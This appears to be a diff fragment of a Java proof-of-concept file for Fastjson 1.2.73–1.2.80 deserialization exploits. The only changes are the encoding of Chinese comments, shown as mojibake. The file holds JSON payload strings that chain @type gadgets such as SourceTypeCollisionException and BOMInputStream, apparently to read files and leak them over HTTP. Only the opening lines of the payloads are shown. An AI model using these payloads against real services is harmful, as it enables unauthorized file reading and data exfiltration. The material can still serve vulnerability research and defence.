@@ -5,7 +5,7 @@ import com.alibaba.fastjson.JSON;
 public class Fastjson21_ajt_xalan_dom4j_io_read_httplog {
     public static void main(String[] args){
     	
-        //“¿¿µ1.2.73-1.2.80£¨“¿¿µaspectjtools  xalan-2.7.2 dom4j-2.1.3  commons-io-2.2
+        //‰æùËµñ1.2.73-1.2.80 ‰æùËµñaspectjtools  xalan-2.7.2 dom4j-2.1.3  commons-io-2.2
     	String poc1 = "[{\r\n"
     			+ "		\"@type\": \"java.lang.Exception\",\r\n"
     			+ "		\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\r\n"
@@ -72,7 +72,7 @@ public class Fastjson21_ajt_xalan_dom4j_io_read_httplog {
         		+ "		}\r\n"
         		+ "	}\r\n"
         		+ "}";
-    	//http¥¯≥ˆ
+    	//http¬¥√∏¬≥√∂
         String poc5  = "{\r\n"
     			+ "                        \"@type\": \"java.io.InputStream\",\r\n"
     			+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
